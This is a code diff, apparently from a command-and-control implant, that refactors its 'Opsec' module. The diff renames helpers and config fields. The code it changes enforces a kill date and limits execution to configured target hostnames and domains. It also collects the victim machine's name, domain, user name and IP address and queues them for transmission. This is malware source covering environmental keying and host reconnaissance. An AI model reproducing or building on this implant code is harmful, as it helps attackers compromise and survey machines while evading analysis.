@@ -1,4 +1,5 @@
-#include <include/opsec.hpp>
+#include <core/include/opsec.hpp>
+
 using namespace Stream;
 using namespace Commands;
 using namespace Utils::Time;
@@ -22,8 +23,8 @@ namespace Opsec {
 
     BOOL CheckTime() {
 
-        if (Ctx->config.killdate != 0) {
-            if (GetTimeNow() >= Ctx->config.killdate) {
+        if (Ctx->config.kill_date != 0) {
+            if (GetTimeNow() >= Ctx->config.kill_date) {
                 Shutdown(nullptr);
             }
         }
@@ -86,53 +87,53 @@ namespace Opsec {
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
             if (Ctx->config.hostname[0]) {
-                if (x_strncmp(buffer, Ctx->config.hostname, x_strlen(Ctx->config.hostname)) != 0) {
+                if (MbsBoundCompare(buffer, Ctx->config.hostname, MbsLength(Ctx->config.hostname)) != 0) {
                     return false;
                 }
             }
             PackString(out, buffer);
         }
         else {
-            PackDword(out, 0);
+            PackUint32(out, 0);
         }
 
-        x_memset(buffer, 0, MAX_PATH);
+        MemSet(buffer, 0, MAX_PATH);
         length = MAX_PATH;
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
             if (Ctx->transport.domain[0]) {
-                if (x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) != 0) {
+                if (MbsBoundCompare(Ctx->transport.domain, buffer, MbsLength(Ctx->transport.domain)) != 0) {
                     return false;
                 }
             }
             PackString(out, buffer);
         }
         else {
-            PackDword(out, 0);
+            PackUint32(out, 0);
         }
 
 
-        x_memset(buffer, 0, MAX_PATH);
+        MemSet(buffer, 0, MAX_PATH);
         length = MAX_PATH;
 
         if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
             PackString(out, buffer);
         }
         else {
-            PackDword(out, 0);
+            PackUint32(out, 0);
         }
 
-        x_memset(buffer, 0, MAX_PATH);
+        MemSet(buffer, 0, MAX_PATH);
         length = sizeof(IP_ADAPTER_INFO);
 
         if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
             PackString(out, adapter.IpAddressList.IpAddress.String);
         }
         else {
-            PackDword(out, 0);
+            PackUint32(out, 0);
         }
 
-        x_memset(&adapter, 0, sizeof(IP_ADAPTER_INFO));
+        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
 
     defer:
         Dispatcher::MessageQueue(out);
